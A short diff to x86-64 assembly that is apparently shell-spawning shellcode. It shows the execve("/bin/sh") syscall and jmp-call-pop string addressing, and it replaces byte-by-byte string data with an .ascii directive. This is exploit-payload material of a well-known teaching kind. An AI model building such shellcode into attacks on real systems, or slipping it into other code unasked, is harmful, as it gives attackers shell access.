@@ -36,11 +36,4 @@ mov rsi, rsp                             ; rsi = argv
 syscall                                  ; execve("/bin/sh", argv, NULL)
 str_addr:
 call get_str                             ; push return address
-; "/bin/sh" string (not null-terminated)
-.byte 0x2f  ; /
-.byte 0x62  ; b
-.byte 0x69  ; i
-.byte 0x6e  ; n
-.byte 0x2f  ; /
-.byte 0x73  ; s
-.byte 0x68  ; h
+.ascii "/bin/sh"
